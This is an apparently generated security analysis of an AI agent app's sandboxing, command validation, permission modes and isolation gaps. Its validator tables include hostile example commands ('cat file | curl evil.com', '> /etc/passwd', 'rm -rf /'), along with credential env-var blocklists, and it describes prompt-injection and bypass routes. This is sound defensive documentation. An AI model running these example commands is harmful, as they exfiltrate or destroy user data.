# Craft Agents OSS — Sandbox & Isolation Analysis

> Detailed analysis of every sandboxing, isolation, and containment mechanism — what it protects, how it works, why it's effective, and where the gaps are.

---

## Table of Contents

1. [Sandbox Architecture Overview](#sandbox-architecture-overview)
2. [Environment Isolation](#1-environment-isolation)
3. [Filesystem Isolation](#2-filesystem-isolation)
4. [Network Isolation](#3-network-isolation)
5. [Command Validation](#4-command-validation)
6. [Permission Mode System](#5-permission-mode-system)
7. [Tool Permission Pipeline](#6-tool-permission-pipeline)
8. [Path Containment](#7-path-containment)
9. [MCP Server Isolation](#8-mcp-server-isolation)
10. [Session & Workspace Isolation](#9-session--workspace-isolation)
11. [Privileged Execution Broker](#10-privileged-execution-broker)
12. [Container Deployment Isolation](#11-container-deployment-isolation)
13. [Gaps & Limitations](#gaps--limitations)

---

## Sandbox Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                         Host Process                                │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │                    Permission Mode System                      │  │
│  │       safe (read-only) · ask (approve) · allow-all            │  │
│  └───────────────────────────┬───────────────────────────────────┘  │
│                              │                                      │
│  ┌───────────────────────────▼───────────────────────────────────┐  │
│  │                   PreToolUse Pipeline                          │  │
│  │  Mode check → Source block → Prerequisites → Transforms       │  │
│  └──────────┬──────────────┬──────────────────┬──────────────────┘  │
│             │              │                  │                      │
│  ┌──────────▼─────┐ ┌─────▼──────────┐ ┌─────▼──────────────┐      │
│  │ Bash Validator  │ │ Path Containment│ │ API Endpoint Guard │      │
│  │ (AST-based)     │ │ (symlink-aware) │ │ (method + pattern) │      │
│  └────────────────┘ └────────────────┘ └────────────────────┘      │
│                                                                     │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │              Environment Variable Sanitization                 │  │
│  │  Strips 10+ sensitive keys from ALL subprocess environments   │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  ┌──────────────────────┐  ┌────────────────────────────────────┐  │
│  │  Filesystem Sandbox  │  │       Network Sandbox              │  │
│  │  macOS: sandbox-exec │  │  macOS: sandbox-exec (deny net)    │  │
│  │  Linux: bwrap/firejail│  │  Linux: unshare -n / firejail     │  │
│  └──────────────────────┘  └────────────────────────────────────┘  │
│                                                                     │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │                    MCP Client Pool                             │  │
│  │  Proxy pattern · env filtering · health checks · isolation    │  │
│  └───────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 1. Environment Isolation

### Problem

All child processes (MCP servers, tool subprocesses, Pi agent) inherit the parent's environment variables. A malicious MCP server or compromised subprocess could read `ANTHROPIC_API_KEY`, `AWS_SECRET_ACCESS_KEY`, or other credentials directly from `/proc/self/environ` or `process.env`.

### What It Does

**File:** `packages/session-tools-core/src/runtime/sandbox-env.ts`

The system strips a hardcoded blocklist of sensitive environment variables from **every** subprocess environment:

```typescript
export const BLOCKED_ENV_VARS = [
  'ANTHROPIC_API_KEY',
  'CLAUDE_CODE_OAUTH_TOKEN',
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'AWS_SESSION_TOKEN',
  'GITHUB_TOKEN',
  'GH_TOKEN',
  'OPENAI_API_KEY',
  'GOOGLE_API_KEY',
  'STRIPE_SECRET_KEY',
  'NPM_TOKEN',
];
```

Additionally, temporary and cache directories are isolated per-session:

| Variable | Isolated To |
|----------|------------|
| `TMPDIR`, `TMP`, `TEMP` | `{dataDir}/.tmp` |
| `UV_CACHE_DIR` | `{dataDir}/.uv-cache` |
| `XDG_CACHE_HOME` | `{dataDir}/.cache` |
| `PYTHONPYCACHEPREFIX` | `{dataDir}/.pycache` |

### Why It's Effective

- **Blocklist covers major credential types** — Anthropic, AWS, GitHub, OpenAI, Google, Stripe, npm.
- **Cache isolation** prevents cross-session cache poisoning and data leakage via shared temp directories.
- **Applied at the lowest level** — every subprocess spawn path uses the same sanitization, whether it's an MCP server, Pi agent, or tool execution.
- **Explicit passthrough only** — environment variables must be explicitly configured in the source config `env` field to reach a subprocess. Default is deny.

### How It Could Be Bypassed

- **Blocklist, not allowlist** — if a new credential variable is added (e.g., `MISTRAL_API_KEY`) and not added to the blocklist, it would leak.
- **Credential files** — if credentials are stored in files (e.g., `~/.aws/credentials`) rather than env vars, they are accessible unless filesystem isolation is also applied.
- **`/proc/` filesystem** — on Linux, `/proc/{pid}/environ` of the parent process may still be readable if the child has sufficient permissions.

---

## 2. Filesystem Isolation

### Problem

Without filesystem isolation, a compromised subprocess could read any file the user has access to (`/etc/shadow`, `~/.ssh/id_rsa`, `~/.aws/credentials`) or write to any location (`/usr/bin/malware`, `~/.bashrc`).

### What It Does

**File:** `packages/session-tools-core/src/runtime/filesystem-isolation.ts`

The system applies OS-native filesystem sandboxing to script execution subprocesses:

#### macOS: `sandbox-exec`

```typescript
const profileParts = [
  '(version 1)',
  '(deny default)',                              // Deny everything
  '(allow process*)',                            // Allow process creation
  '(allow sysctl-read)',                         // Allow sysctl reads
  '(allow file-read*)',                          // Allow all reads
  '(deny file-write*)',                          // Deny all writes
  `(allow file-write* (subpath "${sessionRoot}"))`, // Allow writes to session dir only
];
```

#### Linux: `bubblewrap` (preferred)

```typescript
args: [
  '--die-with-parent',        // Kill subprocess when parent dies
  '--ro-bind', '/', '/',      // Read-only root filesystem
  '--bind', sessionRoot, sessionRoot,  // Writable session dir only
  '--proc', '/proc',          // Proc filesystem
  '--dev', '/dev',            // Device filesystem
  '--', command, ...args,
]
```

#### Linux: `firejail` (fallback)

```typescript
args: [
  '--quiet',
  `--private=${sessionRoot}`,        // Private home directory
  `--whitelist=${sessionRoot}`,       // Only whitelist session dir
  '--', command, ...args,
]
```

#### Availability Detection

```typescript
function getFilesystemIsolationCommand(command, args, sessionRoot):
  | { status: 'enforced'; backend: string; command, args }
  | { status: 'unavailable'; backend: string; reason: string }
```

### Why It's Effective

- **OS-native sandboxing** — uses kernel-level enforcement, not application-level checks.
- **Default-deny writes** — only the session directory is writable; everything else is read-only.
- **Die-with-parent** — subprocess cannot outlive the host (Linux bubblewrap).
- **Read access preserved** — subprocess can read project files for analysis but cannot modify them.

### Limitations

- **Not applied to all subprocesses** — only script sandbox and transform data tools, not general MCP servers or the Pi agent.
- **macOS `sandbox-exec` is deprecated** — Apple has deprecated this API (though it still works).
- **Requires tool availability** — if `bwrap`, `firejail`, or `sandbox-exec` is not installed, isolation falls back to unavailable.
- **Full read access** — subprocesses can still read any file on the system (including sensitive files).

---

## 3. Network Isolation

### Problem

A compromised subprocess could exfiltrate data by making HTTP requests to attacker-controlled servers, or download malicious payloads.

### What It Does

**File:** `packages/session-tools-core/src/runtime/network-isolation.ts`

Applied to `script_sandbox` tool execution in **all** permission modes:

#### macOS: `sandbox-exec`

```typescript
const profile = '(version 1) (deny network*)';
return {
  status: 'enforced',
  backend: 'sandbox-exec',
  args: ['-p', profile, command, ...args],
};
```

#### Linux: `unshare` (preferred)

```typescript
args: ['-n', '--', command, ...args]
```

Creates a new network namespace with no interfaces — the subprocess has zero network access.

#### Linux: `firejail` (fallback)

```typescript
args: ['--quiet', '--net=none', '--', command, ...args]
```

### Why It's Effective

- **Complete network denial** — the subprocess cannot make any network connection (no HTTP, DNS, TCP, UDP).
- **Kernel-level enforcement** — uses Linux network namespaces or macOS sandbox profiles.
- **Required for script sandbox** — enforced regardless of permission mode (even in `allow-all`).

### Combined Isolation

On macOS, filesystem and network isolation are combined into a single `sandbox-exec` profile:

```typescript
const profileParts = [
  // ... filesystem rules ...
];
// Network denial added as additional rule
profileParts.push('(deny network*)');
```

### Limitations

- **Not applied to MCP servers** — MCP servers (stdio or HTTP) are not network-isolated; they need network access to function.
- **Not applied to Pi agent** — the Pi agent subprocess requires network access to reach LLM APIs.
- **Requires tool availability** — falls back to unavailable if OS tools are not present.

---

## 4. Command Validation

### Problem

AI-generated shell commands are the highest-risk attack surface. Prompt injection could produce commands that delete files, exfiltrate data, or escalate privileges. Simple regex-based validation is trivially bypassed.

### What It Does

The system uses **AST-based parsing** (not regex) to validate shell commands before execution.

#### Bash Validator

**File:** `packages/shared/src/agent/bash-validator.ts`

Uses `bash-parser` to generate a proper Abstract Syntax Tree, then validates each node:

**Blocked constructs:**

| Construct | Example | Why Blocked |
|-----------|---------|-------------|
| Command substitution | `$(whoami)`, `` `whoami` `` | Arbitrary code execution |
| Process substitution | `<(cat /etc/passwd)` | File descriptor injection |
| Pipelines | `cat file \| curl evil.com` | Data exfiltration |
| Redirects | `> /etc/passwd` | File overwrite |
| Parameter expansion | `${PATH}`, `$HOME` | Information disclosure |
| Env assignment | `PATH=... command` | PATH hijacking |
| Background execution | `command &` | Persistent processes |
| Compound operators | `&&`, `||`, `;` | Command chaining |

**Dangerous argument patterns:**

| Command | Dangerous Flag | Why |
|---------|---------------|-----|
| `find` | `-exec`, `-execdir`, `-delete` | Arbitrary execution / deletion |
| `awk` | `system()`, `print \| "cmd"` | Code execution within awk |

**Compound command handling:**

```
git status && rm -rf /
     ✓           ✗
→ BLOCKED (both parts must be safe)
```

**Read-only command allowlist** — defined in `apps/electron/resources/permissions/default.json`:

- File exploration: `ls`, `tree`, `cat`, `head`, `tail`, `file`, `stat`
- Search: `find`, `grep`, `rg`, `ag`, `fd`
- Git read-only: `git status`, `git log`, `git diff`, `git show`
- Package info: `npm ls`, `pip list`, `cargo tree`
- Type checking: `bun run typecheck`, `tsc --noEmit`
- System info: `pwd`, `whoami`, `env`, `ps`, `uname`
- Text processing: `awk`, `jq`, `sort`, `uniq`, `cut`

#### PowerShell Validator

**File:** `packages/shared/src/agent/powershell-validator.ts`

Uses native `System.Management.Automation.Language.Parser` for AST parsing on Windows:

**Blocked constructs:** pipelines `|`, subexpressions `$(...)`, script blocks `{ }`, dot-sourcing `.`, assignments `=`, background `&`.

**Dangerous cmdlets:**

| Category | Cmdlets |
|----------|---------|
| File writing | `Out-File`, `Set-Content`, `Add-Content`, `New-Item`, `Copy-Item`, `Move-Item`, `Remove-Item` |
| Code execution | `Invoke-Expression` (`iex`), `Invoke-Command` (`icm`), `Start-Process` |
| Downloading | `Invoke-WebRequest` (`iwr`), `Invoke-RestMethod` (`irm`) |
| Registry | `Set-ItemProperty`, `New-ItemProperty`, `Remove-ItemProperty` |

#### Windows Path Normalization

Before parsing, Windows backslash paths are normalized for the bash parser:

```typescript
// "C:\Users\test\file.txt" → "C:/Users/test/file.txt"
// Handles quoted strings, trailing backslash before quote, double backslashes
```

### Why It's Effective

- **AST-based** — prevents all known bypass techniques (encoding tricks, whitespace manipulation, null bytes, Unicode abuse).
- **Compound command coverage** — each segment validated independently; `safe && dangerous` is rejected.
- **Platform-specific** — dedicated validators for Bash (macOS/Linux) and PowerShell (Windows).
- **Configurable** — workspace `permissions.json` can extend the allowlist.
- **Helpful error messages** — rejection includes pattern mismatch analysis and suggested alternatives.

### Limitations

- **Allowlist can be over-extended** — a permissive `permissions.json` could allow dangerous commands.
- **Parser bugs** — `bash-parser` may not handle all edge cases in complex shell scripts.
- **Not applied to `allow-all` mode** — when permission mode is `allow-all`, command validation is skipped.

---

## 5. Permission Mode System

### Problem

Different tasks require different trust levels. Exploring a codebase should be read-only; making edits should require approval; automated pipelines may need full access. A single trust level is either too restrictive or too permissive.

### What It Does

**File:** `packages/shared/src/agent/mode-manager.ts`

Three permission modes, switchable per-session via SHIFT+TAB:

| Mode | Canonical Name | Behavior |
|------|---------------|----------|
| **`safe`** | Explore | Read-only. Blocks all writes. Never prompts. |
| **`ask`** | Ask to Edit | Prompts for approval before writes/dangerous ops. Default. |
| **`allow-all`** | Execute | Auto-approves everything. No prompts. |

**Mode state is tracked with full audit trail:**

```typescript
interface ModeState {
  sessionId: string;
  permissionMode: PermissionMode;
  previousPermissionMode?: PermissionMode;
  modeVersion: number;                    // Monotonic increment
  lastChangedAt: string;                  // ISO timestamp
  lastChangedBy: 'user' | 'system' | 'restore' | 'automation';
}
```

### Tool Access by Mode

| Tool | safe | ask | allow-all |
|------|------|-----|-----------|
| `Read`, `Glob`, `Grep` | Always | Always | Always |
| `WebFetch`, `WebSearch` | Always | Always | Always |
| `Task`, `TaskOutput` | Always | Always | Always |
| `LSP` | Always | Always | Always |
| `browser_tool` | Always | Always | Always |
| `SubmitPlan` | Always | Always | Always |
| `Write`, `Edit`, `MultiEdit` | **Blocked** | Prompt | Auto-approve |
| `Bash` | Allowlist only | Prompt | Auto-approve |
| MCP tools | Read-only patterns | Prompt | Auto-approve |
| API tools | GET only | Prompt | Auto-approve |

### Session State Injection

The current permission mode is injected into the system prompt as structured XML:

```xml
<session_state>
  <sessionId>260418-swift-river</sessionId>
  <permissionMode>ask</permissionMode>
  <modeTransition>ask → safe</modeTransition>
  <modeChangedBy>user</modeChangedBy>
  <modeChangedAt>2026-04-18T10:30:00Z</modeChangedAt>
  <plansFolderPath>/workspace/sessions/260418-swift-river/plans</plansFolderPath>
  <dataFolderPath>/workspace/sessions/260418-swift-river/data</dataFolderPath>
</session_state>
```

This makes the LLM aware of its own sandbox constraints.

### Why It's Effective

- **Safe by default** — `ask` mode is the default, requiring explicit approval for destructive operations.
- **Per-session isolation** — mode changes in one session never affect other sessions.
- **Monotonic version tracking** — prevents race conditions where concurrent tool calls bypass mode checks.
- **User signal consumption** — one-time mode switches (e.g., "switch to allow-all for this command") automatically revert.
- **Mode in system prompt** — the LLM knows its constraints and won't attempt blocked operations.

### Limitations

- **`allow-all` disables most protections** — including command validation. Requires user trust.
- **No per-tool mode** — cannot set `safe` for Bash but `allow-all` for Write.
- **Mode switching requires UI** — no API-based mode switching for headless/CI environments.

---

## 6. Tool Permission Pipeline

### Problem

Every tool call must be evaluated against the current permission mode, source state, prerequisites, and configuration — but this logic must be centralized and consistent.

### What It Does

**File:** `packages/shared/src/agent/core/pre-tool-use.ts`

A six-step pipeline runs before every tool execution:

```
Tool Call
  │
  ▼
Step 1: Permission Mode Check
  │   shouldAllowToolInMode() → allow / block
  │
  ▼
Step 2: Source Activation Check
  │   Is the MCP source connected? → allow / source_activation_needed
  │
  ▼
Step 3: Prerequisite Check
  │   Has guide.md been read? → allow / block
  │
  ▼
Step 4: Special Interception
  │   call_llm / spawn_session → intercept
  │
  ▼
Step 5: Input Transforms
  │   Path expansion, config-domain guards, metadata stripping
  │
  ▼
Step 6: Ask-Mode Prompt Decision
  │   Classify: bash / file_write / mcp_mutation / api_mutation
  │   → prompt user / auto-allow
  │
  ▼
Execute Tool
```

### Result Types

```typescript
type PreToolUseCheckResult =
  | { type: 'allow' }                                           // Execute as-is
  | { type: 'modify'; input: Record<string, unknown> }          // Execute with modified input
  | { type: 'block'; reason: string }                           // Block execution
  | { type: 'prompt'; promptType: string; description: string } // Ask user
  | { type: 'source_activation_needed'; sourceSlug: string }    // Activate source first
  | { type: 'call_llm_intercept'; input: Record<string, unknown> }  // Handle internally
  | { type: 'spawn_session_intercept'; input: Record<string, unknown> }
```

### Input Transforms (Step 5)

| Transform | What It Does |
|-----------|-------------|
| Path expansion | `~/file` → `/home/user/file` |
| Config-domain bash guard | Blocks direct edits to `labels/`, `sources/`, `skills/`, `automations.json` |
| Config file validation | Validates config files before writing |
| CLI redirect | Suggests `craft-agent` CLI for config operations |
| Skill qualification | Resolves skill plugin name prefixes |
| Metadata stripping | Removes `_intent`, `_displayName` internal fields |

### Config-Domain Protection

Certain configuration paths are protected from direct agent modification:

```
labels/**                    → Blocked (use craft-agent label CLI)
sources/{slug}/config.json   → Redirect to craft-agent source CLI
skills/{slug}/SKILL.md       → Redirect to craft-agent skill CLI
automations.json             → Redirect to craft-agent automation CLI
```

This prevents an LLM from silently modifying its own configuration or automations.

### Why It's Effective

- **Single enforcement point** — all tool calls pass through the same pipeline.
- **Layered checks** — a single bypass cannot compromise the system; each step catches different threat classes.
- **Modifiable results** — the pipeline can transform inputs (e.g., path expansion) rather than just allow/block.
- **Source gating** — MCP tools require their source to be connected, preventing stale/disconnected tool calls.

---

## 7. Path Containment

### Problem

Path traversal attacks (`../../etc/passwd`), symlink escapes, and sibling-prefix bypasses (`/workspace-evil/` matching `/workspace/`) can let agents access files outside the intended directory.

### What It Does

**File:** `packages/session-tools-core/src/runtime/path-security.ts`

#### Symlink-Aware Containment

```typescript
function isPathWithinDirectory(targetPath: string, baseDir: string): boolean {
  // Step 1: Lexical check (path.relative semantics)
  if (!isWithin(resolvedBase, resolvedTarget)) return false;

  // Step 2: Real path check (resolves symlinks)
  const realBase = realpathIfExists(resolvedBase);
  const realTarget = realpathIfExists(resolvedTarget);
  return isWithin(realBase, realTarget);
}
```

#### Creation Path Validation

For new files that don't exist yet (no real path available):

```typescript
function isPathWithinDirectoryForCreation(targetPath: string, baseDir: string): boolean {
  // Walk up from target until we find an existing ancestor
  // Validate that ancestor's real path is within baseDir
  // Ensures symlink chain is safe before creation
}
```

#### Write Path Restrictions (Explore Mode)

Only these paths are writable in safe/explore mode:

| Path | Purpose |
|------|---------|
| `{session}/plans/` | Plan files for review |
| `{session}/data/` | Transform data output |
| Custom `allowedWritePaths` | User-configured glob patterns |

#### Write Target Extraction

The system detects write targets from shell commands:

```typescript
// Bash: echo "hello" > /etc/passwd  →  target: /etc/passwd
// PowerShell: | Out-File -FilePath 'C:\secret.txt'  →  target: C:\secret.txt
// Shell wrapper: /bin/zsh -lc "cat x > y"  →  target: y
```

### Why It's Effective

- **Double validation** — both lexical AND real-path checks prevent symlink escapes.
- **Creation-safe** — handles new files that don't exist yet by checking nearest existing ancestor.
- **Write target extraction** — catches writes hidden in shell commands, not just explicit `Write` tool calls.
- **Glob patterns** — `allowedWritePaths` supports `**`, `*`, `?` for flexible configuration.
- **Cross-platform** — Windows case-insensitive comparison prevents bypass via case differences.

### Limitations

- **Full read access** — in all modes, the agent can read any file the user has access to.
- **TOCTOU** — time-of-check-to-time-of-use: a symlink could be created between validation and write.
- **Race conditions** — concurrent writes to the same path could bypass checks.

---

## 8. MCP Server Isolation

### Problem

MCP servers are third-party code running as subprocesses on the user's machine. A malicious or compromised MCP server could steal credentials, access the filesystem, or make network requests.

### What It Does

#### Centralized Connection Pool

**File:** `packages/shared/src/mcp/mcp-pool.ts`

All MCP connections are managed through a central `McpClientPool`:

```
Agent Backend (Claude/Pi)
  │
  │  Proxy tool call: mcp__linear__createIssue
  │
  ▼
McpClientPool
  │
  │  Resolve: slug=linear, tool=createIssue
  │
  ▼
MCP Client → Linear Server (stdio or HTTP)
```

**Benefits:**
- Agents never connect directly to MCP servers
- Pool manages lifecycle (connect, disconnect, reconnect)
- Tool name proxy pattern prevents namespace collisions
- Shared clients across sessions

#### Environment Variable Filtering

**File:** `packages/shared/src/mcp/client.ts`

Stdio MCP servers receive a sanitized environment:

```typescript
const processEnv: Record<string, string> = {};
for (const [key, value] of Object.entries(process.env)) {
  if (value !== undefined && !BLOCKED_ENV_VARS.includes(key)) {
    processEnv[key] = value;
  }
}
// Custom env vars from source config merged after filtering
this.transport = new StdioClientTransport({
  command: config.command,
  args: config.args,
  env: { ...processEnv, ...config.env },
});
```

#### Source Health Checks

**File:** `packages/shared/src/mcp/validation.ts`

- Connection testing via SDK's `mcpServerStatus()`
- Tool schema validation (property naming patterns: `^[a-zA-Z0-9_.-]{164}$`)
- Error type detection: `failed`, `needs-auth`, `pending`, `invalid-schema`, `disabled`

#### Local MCP Control

**File:** `packages/shared/src/mcp/mcp-pool.ts`

Stdio MCP sources can be disabled per-workspace:

```typescript
const localEnabled = !this.workspaceRootPath || isLocalMcpEnabled(this.workspaceRootPath);
// If disabled, stdio MCP servers are filtered out
// HTTP/SSE MCP servers are always available
```

Controlled by `CRAFT_LOCAL_MCP_ENABLED` env var or workspace config.

### Why It's Effective

- **Proxy pattern** — agents never have direct MCP server handles; all calls route through the pool.
- **Env sanitization** — credentials are stripped before spawning stdio MCP servers.
- **Health checks** — detect compromised or misconfigured servers before tool calls.
- **Local MCP toggle** — enterprises can disable stdio MCP (highest risk) while keeping HTTP/SSE.

### Limitations

- **No filesystem isolation for MCP servers** — stdio MCP servers run with the user's full filesystem access.
- **No network isolation for MCP servers** — they can make arbitrary network requests.
- **No resource limits** — MCP servers can consume unbounded CPU, memory, or file descriptors.
- **Schema validation is limited** — only property names are checked, not values or behavioral constraints.

---

## 9. Session & Workspace Isolation

### Problem

Multiple sessions and workspaces must not interfere with each other. Session data (conversations, attachments, plans) must be isolated per-session and per-workspace.

### What It Does

#### Session Directory Structure

```
{workspaceRootPath}/sessions/{sessionId}/
├── session.jsonl          # Conversation data (JSONL format)
├── attachments/           # Uploaded files
├── plans/                 # Plan files (writable in explore mode)
├── data/                  # Transform data output (writable in explore mode)
├── long_responses/        # Summarized tool results
└── downloads/             # Binary files from API sources
```

#### Session ID Sanitization

```typescript
function getSessionPath(workspaceRootPath: string, sessionId: string): string {
  const safeSessionId = sanitizeSessionId(sessionId);  // Defense-in-depth
  return join(getWorkspaceSessionsPath(workspaceRootPath), safeSessionId);
}
```

Prevents path traversal via malicious session IDs.

#### Workspace Structure

```
~/.craft-agent/workspaces/{workspaceId}/
├── config.json            # Workspace configuration
├── sources/               # Source configurations
├── sessions/              # Session data
└── skills/                # Skill definitions
```

Each workspace has completely separate sessions, sources, and configuration.

#### Permission Manager State

Permission mode is tracked per-session:

```typescript
// Map<sessionId, ModeState>
private modeStates: Map<string, ModeState>;
```

No global state — mode changes in one session never affect other sessions.

### Why It's Effective

- **Directory-based isolation** — each session and workspace has a separate directory tree.
- **Sanitized IDs** — session IDs are validated before use in path construction.
- **No shared state** — permission modes, tool whitelists, and command history are per-session.
- **Separate credentials** — each workspace has its own encrypted credential store entries.

---

## 10. Privileged Execution Broker

### Problem

Some operations require elevated privileges (installing software, system configuration). These should require explicit, time-limited approval with integrity verification.

### What It Does

**File:** `packages/server-core/src/services/privileged-execution-broker.ts`

#### Approval Workflow

```
Agent requests privileged command
  │
  ▼
Broker creates request with:
  - Command (SHA256 hashed for integrity)
  - TTL (default: 120 seconds)
  - Policy check (allowlisted commands only)
  │
  ▼
User approves or denies
  │
  ▼
Broker validates:
  - Not expired (TTL check)
  - Hash matches (command not modified)
  - Policy allows (allowlist check)
  │
  ▼
Execute or reject
```

#### Allowlisted Commands

Currently allowlisted for privileged execution:

```
brew install --cask <package>
brew upgrade --cask <package>
installer -pkg <pkg> -target /
```

#### Audit Trail

All privileged action events logged to `~/.craft-agent/logs/privileged-actions.jsonl`:

- `privileged_request_created`
- `privileged_request_approved`
- `privileged_request_denied`
- `privileged_request_hash_mismatch`
- `privileged_request_blocked_by_policy`
- `privileged_request_expired`

### Why It's Effective

- **SHA256 integrity** — detects if the command was modified between approval and execution.
- **TTL expiration** — approvals auto-expire after 120 seconds, preventing replay attacks.
- **Policy allowlist** — only pre-approved command patterns can be privileged.
- **Full audit trail** — every request, approval, denial, and mismatch is logged.

---

## 11. Container Deployment Isolation

### Problem

When deployed as a server, the agent needs OS-level isolation from the host.

### What It Does

**File:** `Dockerfile.server`

```dockerfile
# Non-root user (Claude Code SDK refuses to run as root)
RUN groupadd -r craftagents && \
    useradd -r -g craftagents -m -d /home/craftagents -s /bin/bash craftagents

USER craftagents

# Volume mount for persistence
# -v ~/.craft-agent:/home/craftagents/.craft-agent
```

- Runs as non-root user (`craftagents`)
- Home directory isolated to `/home/craftagents`
- Config directory mounted as volume
- No root access within container

### Why It's Effective

- **Non-root** — containerized process cannot modify system files or install software.
- **Volume-scoped config** — only `.craft-agent` directory is mounted; rest of host is isolated.
- **Claude SDK requirement** — the SDK itself refuses to run as root, providing defense in depth.

---

## Gaps & Limitations

### Critical Gaps

| Gap | Risk | Mitigation |
|-----|------|-----------|
| **No filesystem isolation for MCP servers** | Malicious MCP server can read/write any file | Run MCP servers in separate containers |
| **No network isolation for MCP servers** | MCP server can exfiltrate data via HTTP | Apply network namespace isolation |
| **No resource limits** | MCP server can consume unbounded CPU/memory | Add cgroup/ulimit constraints |
| **Environment blocklist, not allowlist** | New credential variables may leak | Switch to allowlist model |

### Moderate Gaps

| Gap | Risk | Mitigation |
|-----|------|-----------|
| **Full read access in all modes** | Agent can read sensitive files (`~/.ssh/`, `~/.aws/`) | Add configurable read path restrictions |
| **No OS-level sandboxing on Windows** | `sandbox-exec`/`bwrap` unavailable on Windows | Investigate Windows Sandbox or AppContainers |
| **`allow-all` disables most protections** | User error or prompt injection could enable | Add cool-down timer or confirmation for `allow-all` |
| **No seccomp/AppArmor profiles** | Syscall-level attacks not mitigated | Add seccomp filters to subprocess spawning |

### Minor Gaps

| Gap | Risk | Mitigation |
|-----|------|-----------|
| **macOS `sandbox-exec` deprecated** | May break in future macOS versions | Migrate to App Sandbox or Seatbelt alternatives |
| **TOCTOU on path checks** | Race condition between check and write | Use `O_CREAT | O_EXCL` for atomic file creation |
| **No per-tool permission mode** | Cannot mix safe Bash with allow-all Write | Implement per-tool mode configuration |
| **Cache isolation per-session only** | Cross-session attacks via shared workspace | Add workspace-level cache separation |
| **No bandwidth/rate limits for MCP** | MCP server could flood network | Add bandwidth throttling per MCP source |

### Recommended Improvements

1. **Allowlist-based environment model** — instead of blocking known sensitive variables, only pass explicitly approved variables to subprocesses.

2. **Container-isolated MCP servers** — spawn each MCP server in a lightweight container (bubblewrap, gVisor) with restricted filesystem and network access.

3. **Read path restrictions** — allow users to configure which directories the agent can read, not just write.

4. **Resource cgroups** — limit CPU, memory, and file descriptors for all subprocesses.

5. **Syscall filtering (seccomp)** — block dangerous syscalls (`execve` from MCP servers, `mount`, `chroot`).

6. **Windows sandboxing** — implement AppContainer or Windows Sandbox for script execution on Windows.

7. **Bandwidth monitoring** — track and alert on unusual network traffic from MCP servers.

8. **Periodic permission re-confirmation** — for long-running sessions in `allow-all` mode, periodically re-confirm with the user.

---

*Document generated from codebase analysis. Last updated: 2026-04-18.*
